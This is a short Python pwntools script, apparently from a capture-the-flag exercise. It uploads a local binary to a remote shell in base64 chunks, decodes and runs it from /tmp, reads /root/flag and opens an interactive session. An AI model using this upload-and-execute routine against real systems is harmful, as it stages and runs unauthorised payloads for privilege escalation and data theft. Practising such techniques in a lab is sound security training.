from pwn import *

def send_command(cmd, print_cmd = True, print_resp = False):
	if print_cmd:
		log.info(cmd)

	p.sendlineafter(b"$", cmd.encode())
	resp = p.recvuntil(b"$").decode()

	if print_resp:
		log.info(resp)

	p.unrecv(b"$")
	return resp

def send_file(src, dst):
	file = read(src)	
	f = b64e(file)

	send_command(f"rm -f {dst}.b64")
	send_command(f"rm -f {dst}")

	size = 950
	for i in range(len(f)//size + 1):
		log.info("Sending chunk {}/{}".format(i, len(f)//size))
		send_command(f"echo -n '{f[i*size:(i+1)*size]}' >> {dst}.b64", False)

	send_command(f"cat {dst}.b64 | base64 -d > {dst}")


if len(sys.argv) != 5:
    print("usage: ./send.py <IP> <PORT> <FILE TO SEND> <PATH ON REMOTE>")
    exit(-1)

p = remote(sys.argv[1], int(sys.argv[2]))
send_file(sys.argv[3], sys.argv[4])
send_command("cd /tmp; gzip -d a.out.gz; chmod +x /tmp/a.out", print_cmd=True, print_resp=True)
send_command("./a.out", print_cmd=True, print_resp=True)


cmd = "cat /root/flag"
log.info(cmd)

p.sendlineafter(b"tmp", cmd.encode())
resp = p.recvuntil(b"tmp").decode()

log.info(resp)


p.interactive()
